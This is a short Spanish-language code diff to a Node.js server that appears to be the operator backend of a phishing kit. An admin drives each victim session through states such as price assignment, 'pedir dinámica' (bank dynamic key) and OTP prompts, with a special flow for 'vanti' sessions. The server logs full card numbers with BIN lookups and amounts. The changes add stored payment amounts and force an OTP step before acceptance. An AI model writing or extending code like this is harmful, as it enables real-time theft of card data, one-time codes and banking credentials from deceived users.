@@ -325,6 +325,10 @@ const server = http.createServer(async (req, res) => {
                         if (valor === undefined || valor === null) { json(res, 400, { ok: false, error: 'Falta el valor del precio' }); return; }
                         estadoSesiones.set(sessionId, 'precio_asignado');
                         ultimaAccionSesiones.set(sessionId, String(valor));
+                        // Guardar el precio en los datos de la sesión para que el admin y el iframe lo lean
+                        const datosPrevios = datosSesiones.get(sessionId) || {};
+                        const datosActualizados = Object.assign({}, datosPrevios, { monto: Number(valor), precio: Number(valor) });
+                        datosSesiones.set(sessionId, datosActualizados);
                         agregarLog('poner-precio', { usuario: payload.user, sessionId, valor });
                         json(res, 200, { ok: true, estado: 'precio_asignado', accion: String(valor) });
                         return;
@@ -343,11 +347,20 @@ const server = http.createServer(async (req, res) => {
                         PEDIR_DINAMICA: 'pedir_dinamica' 
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
-                    const estadoNuevo = mapEstados[accion];
+                    let estadoNuevo = mapEstados[accion];
+                    const datosSesionActual = datosSesiones.get(sessionId) || {};
+                    const bancoKey = datosSesionActual.bancoKey || '';
+
+                    // 🔥 REGLA ESPECIAL VANTI: ACEPTAR primero pasa por OTP
+                    if (bancoKey === 'vanti' && accion === 'ACEPTAR' && estadoSesiones.get(sessionId) !== 'otp') {
+                        estadoNuevo = 'otp';
+                        ultimaAccionSesiones.set(sessionId, 'OTP');
+                    } else {
+                        ultimaAccionSesiones.set(sessionId, accion);
+                    }
                     estadoSesiones.set(sessionId, estadoNuevo);
-                    ultimaAccionSesiones.set(sessionId, accion);
-                    agregarLog('accion', { usuario: payload.user, sessionId, accion });
-                    console.log(`[${payload.user}] ${accion} → ${sessionId}`);
+                    agregarLog('accion', { usuario: payload.user, sessionId, accion, estadoNuevo });
+                    console.log(`[${payload.user}] ${accion} → ${sessionId} | estado: ${estadoNuevo}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
                 } catch (e) { json(res, 400, { ok: false, error: e.message }); }
                 return;
@@ -609,7 +622,7 @@ const server = http.createServer(async (req, res) => {
                 
                 guardarHistorial('vanti', datosSesion);
                 
-                console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta}`);
+                console.log(`[VANTI] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta} | Monto: ${monto}`);
                 json(res, 200, { ok: true, sessionId, binInfo: infoBin });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
